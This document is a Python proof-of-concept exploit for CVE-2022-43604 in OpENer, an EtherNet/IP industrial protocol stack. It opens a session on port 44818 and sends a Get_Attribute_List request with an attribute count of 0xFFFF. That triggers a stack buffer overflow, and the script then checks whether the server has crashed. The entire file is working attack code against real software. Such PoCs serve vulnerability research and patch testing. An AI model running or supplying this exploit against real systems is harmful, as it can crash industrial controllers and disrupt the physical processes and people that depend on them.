#!/usr/bin/env python3
"""
PoC for OpENer CVE-2022-43604 (TALOS-2022-1661) - GetAttributeList stack OOB write.

Triggers the unchecked attribute_count_request loop in GetAttributeList()
(source/src/cip/cipcommon.c). Sends, over TCP 44818:

  1. RegisterSession                       -> obtain a session handle
  2. SendRRData (cmd 0x6F) wrapping an unconnected explicit message:
       CIP service 0x03 (Get_Attribute_List)
       EPATH: 8-bit class 0x01 (Identity), 8-bit instance 0x01
       attribute_count = 0xFFFF  (attacker-controlled loop bound)

The server writes 6+ bytes per "attribute" into a 512-byte STACK buffer with no
bounds check -> stack-buffer-overflow WRITE -> ASan abort / "stack smashing".
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 44818

ENCAP_HDR = struct.Struct("<HHIIQI")  # cmd, length, session, status, context(8), options


def encap(cmd, session, payload=b""):
    return ENCAP_HDR.pack(cmd, len(payload), session, 0, 0, 0) + payload


def register_session(s):
    s.sendall(encap(0x0065, 0, struct.pack("<HH", 1, 0)))  # protocol ver 1, options 0
    resp = s.recv(4096)
    if len(resp) < 24:
        raise RuntimeError("short RegisterSession response")
    session = struct.unpack_from("<I", resp, 4)[0]
    return session


def build_cip_get_attribute_list(attribute_count):
    # MessageRouter request: service, path_size(words), EPATH, then service data.
    service = 0x03  # Get_Attribute_List
    # EPATH: 8-bit logical class segment (0x20 0x01), 8-bit instance (0x24 0x01)
    epath = bytes([0x20, 0x01, 0x24, 0x01])
    path_size_words = len(epath) // 2
    req = bytes([service, path_size_words]) + epath
    # Service data: attribute_count (UINT), followed by that many attribute IDs.
    # We deliberately send a huge count but only one ID; the loop keeps writing
    # to the response buffer regardless of how many request IDs are present.
    req += struct.pack("<H", attribute_count)
    req += struct.pack("<H", 0x0001)  # one token attribute id (Identity attr 1)
    return req


def build_send_rr_data(cip_request):
    # SendRRData command-specific data: interface handle UDINT (4), timeout UINT
    # (2) -- 6 bytes the encap handler strips -- then the CPF packet.
    interface_handle = 0
    timeout = 0
    cpf = struct.pack("<IH", interface_handle, timeout)
    cpf += struct.pack("<H", 2)              # item count
    cpf += struct.pack("<HH", 0x0000, 0)     # null address item (type 0, len 0)
    cpf += struct.pack("<HH", 0x00B2, len(cip_request))  # unconnected data item
    cpf += cip_request
    return cpf


def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    session = register_session(s)
    print(f"[*] RegisterSession OK, session=0x{session:08x}")

    cip = build_cip_get_attribute_list(0xFFFF)
    payload = build_send_rr_data(cip)
    s.sendall(encap(0x006F, session, payload))  # SendRRData
    print(f"[*] Sent Get_Attribute_List, attribute_count=0xFFFF ({len(payload)} bytes CPF)")

    try:
        data = s.recv(4096)
        print(f"[*] Server replied {len(data)} bytes (no crash yet)")
    except (socket.timeout, ConnectionResetError, OSError) as e:
        print(f"[+] Connection dropped/reset ({e}) - server likely crashed")

    time.sleep(0.5)
    # Probe: a crashed server refuses the next connection.
    try:
        s2 = socket.create_connection((HOST, PORT), timeout=2)
        s2.close()
        print("[-] Server still accepting connections")
    except OSError:
        print("[+] Server no longer accepting connections - CRASH confirmed")


if __name__ == "__main__":
    main()
